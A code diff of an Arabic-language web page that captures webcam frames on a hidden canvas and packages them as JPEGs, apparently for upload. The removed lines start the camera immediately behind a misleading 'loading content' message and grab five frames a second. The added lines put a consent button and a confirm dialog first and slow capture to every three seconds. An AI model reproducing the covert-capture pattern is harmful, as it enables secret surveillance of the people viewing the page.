@@ -11,7 +11,8 @@
 </head>
 <body>
 
-  <h2 id="status">جارٍ تحميل المحتوى، الرجاء الانتظار...</h2>
+  <h2 id="status">هل تريد السماح باستخدام الكاميرا؟</h2>
+  <button id="startButton">سماح</button> <!-- زر لتشغيل الكاميرا بعد الموافقة -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
@@ -19,24 +20,35 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const startButton = document.getElementById('startButton');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
+    startButton.addEventListener('click', () => {
+      const userConfirmed = confirm("هل تريد السماح للموقع باستخدام الكاميرا؟");
+      if (userConfirmed) {
+        startCamera();
+      } else {
+        document.getElementById('status').innerText = 'تم رفض الإذن بالكاميرا 🚫';
+      }
+    });
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
           document.getElementById('status').innerText = 'يتم الآن التقاط الصور...';
-          captureFrame(); // بدء التقاط الصور بعد تحميل الكاميرا
-        };
-      })
-      .catch(err => {
-        document.getElementById('status').innerText = 'فشل في الوصول إلى الكاميرا 😓';
-        console.error("خطأ في تشغيل الكاميرا:", err);
-      });
+          startButton.style.display = 'none'; // إخفاء الزر بعد الموافقة
+          captureFrame(); // بدء التقاط الصور
+        })
+        .catch(err => {
+          document.getElementById('status').innerText = 'فشل في الوصول إلى الكاميرا 😓';
+          console.error("خطأ في تشغيل الكاميرا:", err);
+        });
+    }
 
     function captureFrame() {
-      if (video.readyState === 4) { // التأكد من أن الكاميرا جاهزة
-        ctx.clearRect(0, 0, canvas.width, canvas.height); // مسح أي صورة قديمة
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height); // التقاط الإطار الجديد
+      if (video.readyState === 4) {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         canvas.toBlob(blob => {
           const formData = new FormData();
@@ -53,7 +65,7 @@
         }, 'image/jpeg');
       }
 
-      setTimeout(captureFrame, 500); // يلتقط 5 صور جديدة كل ثانية 
+      setTimeout(captureFrame, 3000); // التقاط صورة جديدة كل 3 ثوانٍ
     }
   </script>
 
